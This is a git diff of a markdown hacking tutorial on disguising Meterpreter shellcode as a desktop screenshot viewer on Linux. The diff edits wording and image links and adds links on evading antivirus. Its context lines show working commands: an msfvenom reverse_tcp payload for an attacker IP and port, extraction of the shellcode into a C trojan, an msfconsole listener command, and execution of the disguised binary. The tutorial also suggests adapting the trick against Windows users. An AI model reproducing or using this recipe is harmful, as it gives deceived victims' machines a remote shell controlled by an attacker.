@@ -25,7 +25,7 @@ Social engineering is the art of manipulating users of a computing system into r
 <br />
 
 #### MULTI-THREAD (display screenshot + execute shellcode)
-In this exercise its achieved using the bash **'&'** operator that backgrounds the current system() call of displaying the screenshot to target user while jumping into the next C function (execute shellcode in RAM). I add to use this trick because the system() call works like the **'&&'** operator (bash) that waits for the process to end befor jumping into the next instruction. without the use of **'&'** operator the C program needed to wait for user to close the screenshot befor executing the shellcode into ram, so we will have 2 process working in background (display screenshot and execute shellcode) without waiting for user intervention in the proccess.
+In this exercise its achieved using the bash **'&'** operator that backgrounds the current system() call of displaying the screenshot to target user while jumping into the next C function (execute shellcode in RAM). I add to use this trick because the system() call works like the **'&&'** operator (bash) that waits for the process to end before jumping into the next instruction. without the use of **'&'** operator the C program needed to wait for user to close the screenshot befor executing the shellcode into ram, so we will have 2 process working in background (display screenshot and execute shellcode) without waiting for user intervention in the proccess.
 
 <br />
 
@@ -106,7 +106,7 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 cat chars.raw
 ```
 
-![pic](http://i66.tinypic.com/i6xzyw.png)
+![pic](http://i64.tinypic.com/15efzfp.png)
 
 <br />
 
@@ -116,7 +116,7 @@ cat chars.raw
 pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
 ```
 
-![pic](http://i65.tinypic.com/2090m12.png)
+![pic](http://i67.tinypic.com/2ms094w.png)
 
 The shellcode data its now stored inside a bash local variable named **$pa**. This variable its going to be called in the next exercise (the creation of the C program) to embebbed the shellcode into our C Program while we are creating it.<br />
 
@@ -141,7 +141,7 @@ echo "  ret();" >> payload.c
 echo "}" >> payload.c
 ```
 
-![pic](http://i67.tinypic.com/309rd74.png)
+![pic](http://i65.tinypic.com/25inlle.png)
 WARNING: This C Program only works in Linux distros, but with a few modifications like the inclusion of **<windows.h>**<br />
 lib and with a diferent [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) compiler command syntax, it can be possible to pull out the same trick agains windows users.<br /> 
 
@@ -153,7 +153,7 @@ lib and with a diferent [GCC](https://www.cyberciti.biz/faq/debian-linux-install
 cat payload.c
 ```
 
-![pic](http://i68.tinypic.com/24y1ojb.png)
+![pic](http://i64.tinypic.com/x4eu6s.png)
 
 <br />
 
@@ -175,7 +175,7 @@ WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to
 sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
 ```
 
-![pic](http://i68.tinypic.com/15wlyxs.png)
+![pic](http://i65.tinypic.com/30xc589.png)
 
 <br />
 
@@ -186,7 +186,7 @@ chmod +x desktop_screenshot
 sudo ./desktop_screenshot
 ```
 
-![pic](http://i67.tinypic.com/16h9sax.png)
+![pic](http://i66.tinypic.com/2a8g77r.png)
 
 <br />
 
@@ -199,6 +199,14 @@ sudo ./desktop_screenshot
 #### Video Tutorial
 
 [C Shellcode Linux - Video Tutorial](https://blablabla.)
+
+<br />
+
+
+#### Usefull links
+[1] [rapid7-whitepaper-metasploit-framework-encapsulating-av-techniques.pdf](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/rapid7-whitepaper-metasploit-framework-encapsulating-av-techniques.pdf)<br />
+[2] [rapid7-hiding-metasploit-shellcode-to-evade-windows-defender/](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)<br />
+[3] [r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md)<br />
 
 <br />
 
